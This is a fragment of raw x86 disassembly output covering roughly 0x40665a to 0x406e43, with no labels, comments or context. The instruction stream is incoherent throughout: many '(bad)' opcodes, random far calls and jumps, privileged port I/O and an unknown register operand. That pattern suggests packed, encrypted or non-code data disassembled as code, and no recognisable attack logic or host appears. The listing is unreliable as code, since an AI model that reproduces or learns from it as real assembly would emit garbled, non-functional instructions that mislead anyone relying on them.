  40665a:	(bad)  
  40665b:	out    0xaa,al
  40665d:	mov    DWORD PTR [edi-0x60],edx
  406660:	stos   BYTE PTR es:[edi],al
  406661:	or     ch,BYTE PTR [edi-0x6b853504]
  406667:	dec    esp
  406668:	imul   esi,DWORD PTR ds:0xd568b7f9,0xe7315e14
  406672:	shl    DWORD PTR [ecx-0x2f],1
  406675:	aaa    
  406676:	mov    ebx,0x9bc40683
  40667b:	jp     0x40664b
  40667d:	and    dh,BYTE PTR [ebp-0x63]
  406680:	mov    ebp,0x170a4c84
  406685:	or     BYTE PTR [edi+0x7],0x9a
  406689:	adc    al,0xbb
  40668b:	jne    0x406643
  40668d:	mov    al,0x4a
  40668f:	nop
  406690:	retf   0xaf96
  406693:	jg     0x40663d
  406695:	sbb    al,0x6d
  406697:	inc    edi
  406698:	icebp  
  406699:	add    BYTE PTR [ebp-0x4f],al
  40669c:	sbb    eax,0xbe3fbf3c
  4066a1:	pop    edx
  4066a2:	xor    al,0x71
  4066a4:	jge    0x40662f
  4066a6:	addr16 jno 0x4066b1
  4066a9:	sub    ebp,ebx
  4066ab:	repnz sahf 
  4066ad:	mov    ds:0x6fc9b7c0,eax
  4066b2:	push   0xaabd5662
  4066b7:	mov    eax,DWORD PTR [esi+0x3af76783]
  4066bd:	inc    ebp
  4066be:	mov    gs,WORD PTR [edi+0x6b35d2fb]
  4066c4:	hlt    
  4066c5:	inc    edx
  4066c6:	icebp  
  4066c7:	xor    dh,BYTE PTR gs:[ebp+0x35838cbe]
  4066ce:	push   es
  4066cf:	loopne 0x40667d
  4066d1:	push   ebp
  4066d2:	das    
  4066d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d4:	sub    edi,DWORD PTR [eax]
  4066d6:	in     eax,dx
  4066d7:	push   es
  4066d8:	cld    
  4066d9:	cmp    DWORD PTR [edi-0x150ae8ad],0x78
  4066e0:	jb     0x4066f1
  4066e2:	fs cdq 
  4066e4:	jmp    0x83b8:0x77079230
  4066eb:	adc    BYTE PTR [ebp+edi*2-0x56e33263],al
  4066f2:	rcr    esi,0x4a
  4066f5:	cmp    eax,0x5342763c
  4066fa:	bound  edi,QWORD PTR [edx+0x760fcbac]
  406700:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  406702:	lds    edx,FWORD PTR [ecx-0x62fd8a5]
  406708:	jle    0x406719
  40670a:	mov    dl,0xec
  40670c:	pop    esp
  40670d:	mov    bl,0xba
  40670f:	std    
  406710:	xor    dh,BYTE PTR [ebx+eiz*1-0x38f942d4]
  406717:	mov    eax,0xd35c5233
  40671c:	jbe    0x406782
  40671e:	inc    edi
  40671f:	push   esi
  406720:	pop    edx
  406721:	sbb    ecx,ebx
  406723:	sbb    edi,ebp
  406725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406726:	jbe    0x406799
  406728:	add    al,0xb9
  40672a:	xchg   ecx,eax
  40672b:	lods   eax,DWORD PTR ds:[esi]
  40672c:	adc    eax,0x30a421e2
  406731:	cmp    edx,DWORD PTR [eax+ebx*2]
  406734:	mov    ss,WORD PTR [ecx-0x57149ab8]
  40673a:	fs (bad) 
  40673c:	in     al,dx
  40673d:	xchg   DWORD PTR [eax+ebx*8],ecx
  406740:	jnp    0x406776
  406742:	sbb    esp,DWORD PTR [edx-0x85977b3]
  406748:	dec    ecx
  406749:	pop    ebp
  40674a:	rcl    DWORD PTR es:[eax+0x5c],1
  40674e:	jnp    0x406731
  406750:	jno    0x4067c9
  406752:	leavew 
  406754:	sub    bl,dh
  406756:	mov    ebx,0x85f079f2
  40675b:	push   esi
  40675c:	mov    ah,0x49
  40675e:	pop    ds
  40675f:	cmc    
  406760:	(bad)  [esi]
  406762:	push   eax
  406763:	cwde   
  406764:	mov    WORD PTR [ebx],fs
  406766:	mov    cs,WORD PTR [ebp+ebx*1+0x471e85e3]
  40676d:	add    DWORD PTR [ecx+eiz*1-0x591a8d9],eax
  406774:	jae    0x4067f5
  406776:	cmp    DWORD PTR [edi],ecx
  406778:	inc    esp
  406779:	mov    DWORD PTR [edi],esi
  40677b:	arpl   WORD PTR [ecx+0x3679ed1e],bp
  406781:	push   edx
  406782:	shl    BYTE PTR [esp+ecx*4],1
  406785:	cmp    BYTE PTR [esi],0x1
  406788:	into   
  406789:	(bad)  
  40678a:	push   es
  40678b:	loopne 0x406721
  40678d:	mov    edi,0xa829521d
  406792:	and    BYTE PTR [edi],ch
  406794:	shl    BYTE PTR [ecx],cl
  406796:	xor    al,0x6e
  406798:	xor    BYTE PTR [edi],0xf6
  40679b:	outs   dx,BYTE PTR ds:[esi]
  40679c:	pusha  
  40679d:	jmp    0x23911ea6
  4067a2:	xchg   bl,dh
  4067a4:	call   0x5901:0xd1dee57f
  4067ab:	pusha  
  4067ac:	jbe    0x406731
  4067ae:	shr    BYTE PTR [edx],0x4e
  4067b1:	sti    
  4067b2:	jo     0x406734
  4067b4:	cmp    edx,ebx
  4067b6:	data16 arpl WORD PTR [edx],di
  4067b9:	jae    0x406787
  4067bb:	int3   
  4067bc:	mov    ds:0x8378a716,eax
  4067c1:	mov    dl,0x7b
  4067c3:	cdq    
  4067c4:	xchg   esi,eax
  4067c5:	inc    edx
  4067c6:	sti    
  4067c7:	fadd   DWORD PTR [edx+esi*8+0x3ec0a4ce]
  4067ce:	mov    cs,WORD PTR [eax]
  4067d0:	repz imul ebp,eax,0x51
  4067d4:	ja     0x406830
  4067d6:	xchg   ebx,eax
  4067d7:	lds    edx,FWORD PTR [edx-0x4998be77]
  4067dd:	int3   
  4067de:	dec    edi
  4067df:	adc    esp,DWORD PTR [edx+0x34]
  4067e2:	push   ds
  4067e3:	pop    ebx
  4067e4:	fst    QWORD PTR [esi]
  4067e6:	out    dx,al
  4067e7:	pushf  
  4067e8:	test   BYTE PTR [esi+0x28],ch
  4067eb:	imul   al
  4067ed:	data16 fisttp DWORD PTR [edx+0x79]
  4067f1:	and    eax,eax
  4067f3:	fwait
  4067f4:	clc    
  4067f5:	adc    dh,BYTE PTR [ecx]
  4067f7:	pop    es
  4067f8:	xor    eax,0xbcc9a54
  4067fd:	cmp    dl,BYTE PTR [esi+0x74]
  406800:	iret   
  406801:	xchg   edi,eax
  406802:	jmp    0x406823
  406804:	retf   
  406805:	mov    eax,ds:0x69cfd72c
  40680a:	sub    DWORD PTR [eax],edi
  40680c:	lahf   
  40680d:	cmp    DWORD PTR [ebp+ebx*2+0x23b0096f],eax
  406814:	sbb    BYTE PTR [eax],bh
  406816:	outs   dx,DWORD PTR ds:[esi]
  406817:	jle    0x40686c
  406819:	(bad)  
  40681a:	pop    ds
  40681b:	jno    0x4067c7
  40681d:	fimul  WORD PTR [ebx+0x72c78b66]
  406823:	adc    bl,BYTE PTR [ecx-0x42ed8278]
  406829:	cwde   
  40682a:	push   ebp
  40682b:	idiv   DWORD PTR [ebx-0x61]
  40682e:	js     0x406812
  406830:	jge    0x4067d1
  406832:	(bad)  
  406833:	repnz cmp BYTE PTR [eax-0xe0e312d],0x3a
  40683b:	imul   edx,DWORD PTR [edx+0x314a22bb],0xffffffe3
  406842:	scas   eax,DWORD PTR es:[edi]
  406843:	or     edx,edi
  406845:	mov    al,ds:0x5419047
  40684a:	pusha  
  40684b:	int3   
  40684c:	scas   eax,DWORD PTR es:[edi]
  40684d:	push   cs
  40684e:	cld    
  40684f:	(bad)  
  406850:	push   0x50
  406852:	outs   dx,DWORD PTR ds:[esi]
  406853:	ja     0x406826
  406855:	gs out dx,eax
  406857:	shl    DWORD PTR [ebp+0x35d31a7],1
  40685d:	inc    esi
  40685e:	jmp    0xe795:0x36b1d4c9
  406865:	mov    bh,0xaf
  406867:	arpl   WORD PTR [edi],sp
  406869:	out    dx,al
  40686a:	mov    eax,ds:0xd3d29686
  40686f:	and    BYTE PTR [edx],0x57
  406872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406873:	xor    DWORD PTR [ecx+0x75012e46],eax
  406879:	cmp    cl,ch
  40687b:	or     dl,cl
  40687d:	adc    eax,0x178779bc
  406882:	push   0x71
  406884:	test   al,0xe8
  406886:	mov    DWORD PTR [edi+0x34],0xd9566928
  40688d:	push   0x6eb8d2ed
  406892:	pop    ebp
  406893:	cs cdq 
  406895:	lahf   
  406896:	cmp    ecx,ebp
  406898:	and    edx,esi
  40689a:	cmp    DWORD PTR [ebp+0x53],ecx
  40689d:	iret   
  40689e:	dec    ebx
  40689f:	rcl    eax,0x74
  4068a2:	or     BYTE PTR [ebx+0x77],0xd8
  4068a6:	or     ebx,DWORD PTR [ebx+0x2d]
  4068a9:	sub    eax,0xfd669033
  4068ae:	cmp    edx,DWORD PTR [eax+0x72]
  4068b1:	cmp    BYTE PTR ss:[esi],0x45
  4068b5:	mov    dh,0xea
  4068b7:	rcl    BYTE PTR [edx],0xb2
  4068ba:	arpl   si,ax
  4068bc:	cmp    BYTE PTR [edx+ecx*4-0x12410b2a],bh
  4068c3:	add    dh,bl
  4068c5:	repz jns 0x40689e
  4068c8:	cmp    BYTE PTR [edx+0x49],0xe2
  4068cc:	and    DWORD PTR [ebx],edi
  4068ce:	stos   BYTE PTR es:[edi],al
  4068cf:	data16 cmp BYTE PTR [edi],0xef
  4068d3:	imul   ebp,DWORD PTR [eax-0x5f],0x537e18cd
  4068da:	push   cs
  4068db:	repz leave 
  4068dd:	jge    0x40695d
  4068df:	sub    DWORD PTR ds:0x736d2a23,esp
  4068e5:	push   ebx
  4068e6:	cmp    BYTE PTR [esi+0x1d46540a],ch
  4068ec:	jbe    0x406877
  4068ee:	mov    edx,DWORD PTR [esp+edi*2]
  4068f1:	mov    ds:0x2bc3c65a,al
  4068f6:	mov    ah,BYTE PTR [edi+0x149af76f]
  4068fc:	and    DWORD PTR [esi-0x7b],esp
  4068ff:	mov    ss:0xed1d62a8,al
  406905:	xor    al,0x8d
  406907:	imul   ebx,DWORD PTR [eax+eax*2],0x2
  40690b:	add    al,BYTE PTR [ecx]
  40690d:	ds inc esi
  40690f:	xor    al,0xa0
  406911:	add    DWORD PTR [ebp+ebp*1+0x9],ebp
  406915:	out    dx,al
  406916:	sbb    esi,esi
  406918:	(bad)  
  406919:	into   
  40691a:	sub    cl,BYTE PTR [ecx+ebx*1]
  40691d:	pop    es
  40691e:	pop    es
  40691f:	pop    edx
  406920:	adc    DWORD PTR [ebp-0x42],ebx
  406923:	sbb    al,0x1e
  406925:	xchg   ebp,eax
  406926:	bound  edi,QWORD PTR [ebx]
  406928:	int    0xbc
  40692a:	adc    eax,0xa8469d00
  40692f:	fwait
  406930:	clc    
  406931:	(bad)  
  406932:	aam    0x1a
  406934:	push   ss
  406935:	push   ebx
  406936:	test   DWORD PTR [eax],ebx
  406938:	inc    eax
  406939:	aad    0xfc
  40693b:	pop    edx
  40693c:	or     BYTE PTR [esi],ah
  40693e:	cmp    al,0xd
  406940:	data16 stc 
  406942:	add    DWORD PTR [ecx],ebx
  406944:	call   0x8132:0x64ec04e
  40694b:	pop    ds
  40694c:	mov    al,ds:0x40994d4f
  406951:	scas   al,BYTE PTR es:[edi]
  406952:	mov    ah,0xb6
  406954:	and    eax,0x11bf7047
  406959:	call   0x8aab:0xcc54970c
  406960:	pop    edx
  406961:	mov    eax,ds:0xa7d14940
  406966:	mov    ah,dh
  406968:	daa    
  406969:	mov    bl,0x59
  40696b:	cli    
  40696c:	jecxz  0x4069bd
  40696e:	mov    ebp,DWORD PTR [ebp-0x177c0435]
  406974:	cmp    BYTE PTR [eax+ecx*8],dh
  406977:	jb     0x406910
  406979:	inc    ebp
  40697a:	and    ah,cl
  40697c:	sbb    esi,edi
  40697e:	inc    ebp
  40697f:	and    BYTE PTR [ebp+0x1c273066],dh
  406985:	fs (bad) 
  406987:	(bad)  
  406988:	mov    eax,0xbbc17229
  40698d:	repz lea ebx,ds:0x84da7aeb
  406994:	push   cs
  406995:	hlt    
  406996:	(bad)  [ebx-0x1f]
  406999:	xchg   esp,eax
  40699a:	mov    ebp,DWORD PTR [edx+esi*4]
  40699d:	enter  0x3f5b,0x2f
  4069a1:	xchg   ebp,ebp
  4069a3:	adc    BYTE PTR [edi-0x37],dh
  4069a6:	pop    ebp
  4069a7:	mov    ds:0x91a23ea2,eax
  4069ac:	icebp  
  4069ad:	jne    0x406a2b
  4069af:	neg    esi
  4069b1:	pushf  
  4069b2:	es mov es:0x65a33297,al
  4069b9:	in     al,0xe0
  4069bb:	inc    esi
  4069bc:	sahf   
  4069bd:	push   0x937cac20
  4069c2:	inc    esi
  4069c3:	push   edx
  4069c4:	btr    DWORD PTR [ecx-0xa],ebp
  4069c8:	inc    edi
  4069c9:	xor    esp,DWORD PTR [ecx]
  4069cb:	adc    eax,0x692295bb
  4069d0:	inc    esi
  4069d1:	pop    es
  4069d2:	outs   dx,DWORD PTR fs:[esi]
  4069d4:	dec    edx
  4069d5:	iret   
  4069d6:	and    DWORD PTR [edx],ecx
  4069d8:	mov    ah,0xb
  4069da:	mov    dl,0xe5
  4069dc:	js     0x40695f
  4069de:	out    0x3d,eax
  4069e0:	sbb    ch,BYTE PTR [esi]
  4069e2:	cmp    ecx,DWORD PTR cs:0x46bbfb00
  4069e9:	mov    edx,gs
  4069eb:	sar    BYTE PTR [edi+0x76c3d1b],1
  4069f1:	(bad)  
  4069f2:	aas    
  4069f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069f4:	call   0xda5c:0xe974af4c
  4069fb:	jae    0x406a45
  4069fd:	aam    0x80
  4069ff:	mov    ecx,0xc6f6e0f8
  406a04:	lds    edx,FWORD PTR [esi]
  406a06:	ds push ds
  406a08:	cmp    al,0x36
  406a0a:	js     0x4069a2
  406a0c:	pop    es
  406a0d:	push   ecx
  406a0e:	xchg   DWORD PTR [ebx+0x4667339b],eax
  406a14:	sub    eax,0x5ac36bf7
  406a19:	add    eax,esi
  406a1b:	jne    0x406a02
  406a1d:	push   ebp
  406a1e:	push   edi
  406a1f:	adc    eax,0x318e4cfd
  406a24:	push   ebp
  406a25:	aad    0x81
  406a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a28:	sub    BYTE PTR [edi],0x9b
  406a2b:	push   cs
  406a2c:	hlt    
  406a2d:	xor    al,BYTE PTR [esp+eax*1+0x1c]
  406a31:	xchg   ebp,eax
  406a32:	inc    eax
  406a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a34:	enter  0xce2a,0xcd
  406a38:	stos   BYTE PTR es:[edi],al
  406a39:	aam    0xef
  406a3b:	iret   
  406a3c:	adc    BYTE PTR [ebp-0xb],dl
  406a3f:	mov    edx,0xde0b2b01
  406a44:	lock inc ebx
  406a46:	jle    0x406a64
  406a48:	ss inc ecx
  406a4a:	jle    0x406a08
  406a4c:	and    DWORD PTR [ecx-0x4ede949c],ebp
  406a52:	repz mov al,0x3
  406a55:	icebp  
  406a56:	sub    al,bh
  406a58:	(bad)  
  406a59:	into   
  406a5a:	fwait
  406a5b:	test   al,0xd4
  406a5d:	xchg   esi,eax
  406a5e:	inc    edi
  406a5f:	pop    ds
  406a60:	scas   al,BYTE PTR es:[edi]
  406a61:	or     al,0x36
  406a63:	or     al,0x26
  406a66:	push   eax
  406a67:	aas    
  406a68:	sbb    DWORD PTR [esi-0x29],ebx
  406a6b:	pop    edx
  406a6c:	out    dx,eax
  406a6d:	add    bh,BYTE PTR [esi-0x49]
  406a70:	scas   eax,DWORD PTR es:[edi]
  406a71:	mov    bh,0x56
  406a73:	pop    ebp
  406a74:	and    al,0x53
  406a76:	dec    ecx
  406a77:	and    DWORD PTR [edx-0x3ac75746],0xffffffb6
  406a7e:	mov    dl,0xb6
  406a80:	mov    bl,0x74
  406a82:	push   ss
  406a83:	add    eax,0x3e36c8f2
  406a88:	shl    BYTE PTR [ecx],1
  406a8a:	aas    
  406a8b:	pop    ebx
  406a8c:	push   ecx
  406a8d:	ret    0x67ac
  406a90:	gs pop ebp
  406a92:	adc    ebp,DWORD PTR [ecx-0x58a93164]
  406a98:	jno    0x406aa8
  406a9a:	fld    TBYTE PTR [edi-0x4d]
  406a9d:	test   BYTE PTR [edi-0x10],dl
  406aa0:	out    0x1f,al
  406aa2:	mov    WORD PTR [ebx+0x58516ee1],cs
  406aa8:	add    al,0x1a
  406aaa:	loop   0x406adb
  406aac:	sbb    ebp,DWORD PTR [esi]
  406aae:	(bad)  
  406aaf:	sub    BYTE PTR ds:0xd4ac1e1a,bl
  406ab5:	inc    ebp
  406ab6:	stos   DWORD PTR es:[edi],eax
  406ab7:	retf   0x35ba
  406aba:	pop    eax
  406abb:	scas   eax,DWORD PTR es:[edi]
  406abc:	adc    al,0x13
  406abe:	inc    edi
  406abf:	stos   BYTE PTR es:[edi],al
  406ac0:	rol    DWORD PTR [edi-0x6ec3306e],cl
  406ac6:	sbb    edx,DWORD PTR ds:0xbddc3d12
  406acc:	xor    al,0xb9
  406ace:	adc    ebx,edi
  406ad0:	add    al,0xe3
  406ad2:	loope  0x406b4b
  406ad4:	in     eax,0xcb
  406ad6:	es push 0x1c
  406ad9:	fisubr WORD PTR [esp+edx*1-0x48f698fc]
  406ae0:	and    dh,BYTE PTR ds:[esi]
  406ae3:	xlat   BYTE PTR ds:[ebx]
  406ae4:	lods   eax,DWORD PTR ds:[esi]
  406ae5:	sub    esp,ebx
  406ae7:	and    al,BYTE PTR [ebp-0x7eb3c99b]
  406aed:	sbb    ah,BYTE PTR [ebx-0x159a1db7]
  406af3:	mov    fs,WORD PTR [eax-0x15bb3802]
  406af9:	data16 mov bh,0x32
  406afc:	push   ss
  406afd:	cmp    bh,BYTE PTR [ecx-0x17]
  406b00:	pop    edi
  406b01:	(bad)  
  406b02:	repnz leave 
  406b04:	cli    
  406b05:	jns    0x406afd
  406b07:	xchg   esi,eax
  406b08:	adc    eax,0xb3fc9be
  406b0d:	push   ecx
  406b0e:	mov    edx,0xd321faf2
  406b13:	xor    al,0xd7
  406b15:	test   BYTE PTR [edx-0x7c040aa],0x41
  406b1c:	aaa    
  406b1d:	in     eax,dx
  406b1e:	vmovhpd QWORD PTR [edx],xmm0
  406b22:	mov    ebx,0x464f685b
  406b27:	add    eax,0x990364f
  406b2c:	pusha  
  406b2d:	call   FWORD PTR [esi-0x66]
  406b30:	inc    ebx
  406b31:	sbb    ch,bl
  406b33:	mov    al,0x9
  406b35:	mov    gs,eax
  406b37:	int    0xdd
  406b39:	imul   DWORD PTR [ecx]
  406b3b:	inc    edx
  406b3c:	add    dh,al
  406b3e:	mov    BYTE PTR [esi-0x31489265],al
  406b44:	xchg   BYTE PTR ds:0x38e7f3f3,dh
  406b4a:	mov    edi,0xaf7d7987
  406b4f:	shr    BYTE PTR [edx+0x31045f79],0xd9
  406b56:	and    eax,0x4f529e39
  406b5b:	cmp    ebx,ecx
  406b5d:	les    esi,FWORD PTR [edx-0x258e42a3]
  406b63:	retf   
  406b64:	in     eax,dx
  406b65:	mov    bl,cl
  406b67:	xchg   edi,eax
  406b68:	dec    esp
  406b69:	mov    esi,0x7c441616
  406b6e:	inc    ebx
  406b6f:	xor    BYTE PTR [ecx-0x54b42190],dl
  406b75:	push   ecx
  406b76:	enter  0x7fdc,0xf0
  406b7a:	or     eax,0x74fffc17
  406b7f:	call   0x5811:0x220c34e9
  406b86:	je     0x406b10
  406b88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b89:	xchg   ecx,eax
  406b8a:	mov    ch,0x94
  406b8c:	inc    edx
  406b8d:	xor    eax,0x9f055000
  406b92:	test   eax,0x69cfb916
  406b97:	xor    BYTE PTR [esi-0x57246ec8],ah
  406b9d:	add    BYTE PTR [ebx],ah
  406b9f:	jg     0x406be2
  406ba1:	sar    edx,cl
  406ba3:	inc    edi
  406ba4:	test   esi,ebp
  406ba6:	push   ecx
  406ba7:	gs jns 0x406c00
  406baa:	call   0x78dd:0xc22ca1dc
  406bb1:	jp     0x406b40
  406bb3:	jns    0x406c2b
  406bb5:	lea    esi,[edx+0x4b4eace0]
  406bbb:	scas   al,BYTE PTR es:[edi]
  406bbc:	sbb    al,BYTE PTR [edx+ebx*1+0x69a9d259]
  406bc3:	push   ss
  406bc4:	jl     0x406c30
  406bc6:	sbb    DWORD PTR [edx+0x67],edi
  406bc9:	ficom  WORD PTR [ebp-0x7a205d93]
  406bcf:	cld    
  406bd0:	outs   dx,DWORD PTR gs:[esi]
  406bd2:	mov    ch,0x9a
  406bd4:	cdq    
  406bd5:	pop    eax
  406bd6:	call   0xc14a9c08
  406bdb:	dec    ecx
  406bdc:	int    0xf5
  406bde:	je     0x406b9f
  406be0:	pop    ebx
  406be1:	pop    eax
  406be2:	or     BYTE PTR [esi],0x1a
  406be5:	cmp    eax,0x86c7cdfd
  406bea:	push   ebp
  406beb:	(bad)  [edi-0x24]
  406bee:	xchg   DWORD PTR [ebx+0x46],esi
  406bf1:	or     esi,DWORD PTR [ecx]
  406bf3:	dec    ebx
  406bf4:	jno    0x406c6c
  406bf6:	adc    edx,DWORD PTR [esi-0x4ab9abc7]
  406bfc:	mov    ds:0x168df117,al
  406c01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c02:	outs   dx,DWORD PTR ds:[esi]
  406c03:	dec    ebp
  406c04:	ss into 
  406c06:	daa    
  406c07:	aad    0x9d
  406c09:	xor    ch,bl
  406c0b:	or     DWORD PTR [esi+0x61],ebp
  406c0e:	add    esp,DWORD PTR [ebx+ebx*2+0xeeb36b]
  406c15:	ins    DWORD PTR es:[edi],dx
  406c16:	mov    ch,0x46
  406c18:	mov    al,0xc0
  406c1a:	xchg   ecx,eax
  406c1b:	in     eax,0x6a
  406c1d:	mov    DWORD PTR [ebp-0x1abe9a6b],ebx
  406c23:	adc    eax,0xf07b9d56
  406c28:	daa    
  406c29:	add    ecx,DWORD PTR [edi]
  406c2b:	mov    ebp,0x19f73558
  406c30:	add    DWORD PTR [edi-0x1a715636],esp
  406c36:	pushf  
  406c37:	loope  0x406c05
  406c39:	les    ecx,FWORD PTR [esi-0x67]
  406c3c:	hlt    
  406c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c3e:	aad    0xba
  406c40:	add    DWORD PTR gs:[edi-0x65],esp
  406c44:	mov    eax,0xe40eb435
  406c49:	inc    ebp
  406c4a:	xor    BYTE PTR [eax-0x41d77b83],dl
  406c50:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  406c52:	lock sti 
  406c54:	mov    bl,0x5
  406c56:	or     al,0x82
  406c58:	std    
  406c59:	mov    dl,BYTE PTR [edi-0x3a7efb00]
  406c5f:	js     0x406bfd
  406c61:	mov    esp,0xb17ceec6
  406c66:	jge    0x406c38
  406c68:	adc    al,0xbb
  406c6a:	push   0xffffff91
  406c6c:	cld    
  406c6d:	push   eax
  406c6e:	stc    
  406c6f:	les    ebx,FWORD PTR [edi+0x787b1ce1]
  406c75:	cs xchg esi,eax
  406c77:	xor    DWORD PTR [ecx],ebp
  406c79:	fisttp WORD PTR [edx]
  406c7b:	dec    esi
  406c7c:	sub    al,0x12
  406c7e:	mov    al,0xaf
  406c80:	imul   ebp,DWORD PTR [eax],0x502e00fc
  406c86:	xchg   esi,eax
  406c87:	sbb    BYTE PTR [esi-0x4206f61e],al
  406c8d:	mov    esp,0x2eff4af7
  406c92:	push   ss
  406c93:	ins    BYTE PTR es:[edi],dx
  406c94:	add    al,0x6c
  406c96:	sub    dl,BYTE PTR [edx]
  406c98:	fidiv  DWORD PTR [esi-0x2cff0728]
  406c9e:	xor    al,0x75
  406ca1:	iret   
  406ca2:	int3   
  406ca3:	test   esp,0x9dbefd70
  406ca9:	fdiv   QWORD PTR ds:0x177b24e
  406caf:	lods   eax,DWORD PTR ds:[esi]
  406cb0:	jnp    0x406cac
  406cb2:	sbb    dl,BYTE PTR [edx-0x4e]
  406cb5:	jo     0x406d06
  406cb7:	test   eax,0x520104ab
  406cbc:	pop    esp
  406cbd:	jecxz  0x406cf9
  406cbf:	dec    ebx
  406cc0:	adc    BYTE PTR [edx],dl
  406cc2:	mov    bl,0x13
  406cc4:	xor    ebx,DWORD PTR [ecx]
  406cc6:	fimul  WORD PTR [edx+0x7b21d85c]
  406ccc:	rcl    BYTE PTR [esi+0x40efc22b],0x67
  406cd3:	add    eax,0xd9c33d42
  406cd8:	js     0x406d10
  406cda:	jae    0x406cea
  406cdc:	imul   esp,DWORD PTR [ebx+0x3e42a50b],0xffffff94
  406ce3:	xor    edx,DWORD PTR [edi+0x76be2adf]
  406ce9:	ss inc edx
  406ceb:	or     al,0x6e
  406ced:	push   ss
  406cee:	stos   DWORD PTR es:[edi],eax
  406cef:	jmp    0x7bf1:0xc6134398
  406cf6:	inc    ebp
  406cf7:	ret    0x9e00
  406cfa:	inc    ecx
  406cfb:	xchg   ecx,eax
  406cfc:	mov    ch,0x42
  406cfe:	jle    0x406cbd
  406d00:	int3   
  406d01:	mov    cl,0xc3
  406d03:	mov    dl,0x90
  406d05:	test   DWORD PTR [edx-0x46ae1e3],edi
  406d0b:	popf   
  406d0c:	clc    
  406d0d:	cmp    bh,dh
  406d0f:	sub    DWORD PTR [edx-0xb93c627],ebx
  406d15:	adc    eax,0x419fa0ab
  406d1a:	jp     0x406ce9
  406d1c:	aad    0x7f
  406d1e:	sub    al,BYTE PTR [eax-0x2e]
  406d21:	and    BYTE PTR [edx],ah
  406d23:	push   esp
  406d24:	mov    ?,WORD PTR [esi+0x3b]
  406d27:	lods   eax,DWORD PTR ds:[esi]
  406d28:	mov    ah,BYTE PTR [eax]
  406d2a:	sbb    BYTE PTR [edx-0x70808537],dl
  406d30:	and    BYTE PTR [eax-0x2004848],bh
  406d36:	pop    ebp
  406d37:	dec    ecx
  406d38:	push   ebx
  406d39:	jp     0x406d1b
  406d3b:	pop    ecx
  406d3c:	and    DWORD PTR [ecx-0x26],0xfdc0b0fd
  406d43:	and    BYTE PTR [esi],bl
  406d45:	popf   
  406d46:	mov    DWORD PTR [edi-0x10],ebp
  406d49:	sub    ecx,DWORD PTR [edi-0x41]
  406d4c:	jecxz  0x406cd3
  406d4e:	and    al,0x75
  406d50:	cs jecxz 0x406d6e
  406d53:	mov    ebx,0x21a973ea
  406d58:	int    0x9
  406d5a:	in     al,0xed
  406d5c:	mov    esp,DWORD PTR [ebp+0x43c07172]
  406d62:	dec    ebx
  406d63:	jne    0x406db2
  406d65:	mov    ds:0x3c2c8ef2,al
  406d6a:	cmp    DWORD PTR [ecx+0x66a27ada],ebx
  406d70:	test   al,0x85
  406d72:	sub    ebp,DWORD PTR [edi+0x1]
  406d75:	shr    DWORD PTR [edx-0x35cbf797],0x7e
  406d7c:	jp     0x406d63
  406d7e:	repnz sbb BYTE PTR [ecx+0x67654afc],0x2f
  406d86:	popw   es
  406d88:	mov    bh,0x79
  406d8a:	rcl    BYTE PTR [ecx],0xc1
  406d8d:	ins    DWORD PTR es:[edi],dx
  406d8e:	add    eax,0xb4477e8d
  406d93:	popf   
  406d94:	inc    ecx
  406d95:	fwait
  406d96:	das    
  406d97:	fnop   
  406d99:	out    dx,al
  406d9a:	fcmovne st,st(6)
  406d9c:	test   BYTE PTR [edi-0x7c],ch
  406d9f:	push   cs
  406da0:	pop    esi
  406da1:	push   0x39
  406da3:	arpl   WORD PTR [edi+eiz*2-0xa],di
  406da7:	fcom   DWORD PTR [ebx]
  406da9:	cmp    DWORD PTR [ebx-0x33fa3dfe],edx
  406daf:	inc    eax
  406db0:	sbb    BYTE PTR [edi-0x3d],bh
  406db3:	call   0x3903:0x2c54c62c
  406dba:	pop    edi
  406dbb:	cmp    BYTE PTR [bx+di-0x6d],dl
  406dbf:	inc    ecx
  406dc0:	adc    edi,DWORD PTR [ecx+0x75]
  406dc3:	out    dx,al
  406dc4:	jg     0x406df3
  406dc6:	test   eax,0xa066cd63
  406dcb:	pop    ss
  406dcc:	pop    edi
  406dcd:	(bad)  
  406dcf:	stos   DWORD PTR es:[edi],eax
  406dd0:	aam    0x55
  406dd2:	jp     0x406e2f
  406dd4:	fidivr WORD PTR [ebx-0x4b1f05aa]
  406dda:	cmp    ebx,DWORD PTR [edx]
  406ddc:	fild   WORD PTR ds:0xa65da9d
  406de2:	mov    ecx,0x42f43667
  406de7:	cmp    al,0xf
  406de9:	aam    0x90
  406deb:	scas   eax,DWORD PTR es:[edi]
  406dec:	or     BYTE PTR [eax+ebp*4+0x4],bh
  406df0:	ins    DWORD PTR es:[edi],dx
  406df1:	mov    BYTE PTR [ebx+ebx*8+0x3cc5990a],bl
  406df8:	outs   dx,BYTE PTR ds:[esi]
  406df9:	ret    0xc93d
  406dfc:	scas   al,BYTE PTR es:[edi]
  406dfd:	test   al,0x57
  406dff:	out    0x4c,eax
  406e01:	inc    DWORD PTR [ebp+0x4c2f4c56]
  406e07:	lods   al,BYTE PTR ds:[esi]
  406e08:	fdivrp st(4),st
  406e0a:	rcr    DWORD PTR [esi-0x2ae5304],0xa2
  406e11:	pop    ebx
  406e12:	inc    esp
  406e13:	dec    eax
  406e14:	fsub   DWORD PTR [ebp+0x9a1759f]
  406e1a:	and    esp,DWORD PTR [eax-0x4ad9dfe5]
  406e20:	push   edi
  406e21:	mov    bl,0xa8
  406e23:	xor    bh,al
  406e25:	mov    ds:0xb301235f,al
  406e2a:	pop    esp
  406e2b:	xor    eax,0x32dea313
  406e30:	xor    DWORD PTR [esi+0x6a],ebx
  406e33:	cmp    BYTE PTR [esi-0x6d],ah
  406e36:	sbb    eax,0xf272d7ea
  406e3b:	fsubr  st,st(5)
  406e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e3e:	nop
  406e3f:	out    0xc2,al
  406e41:	mov    dl,0x2b
  406e43:	and    al,0xfe
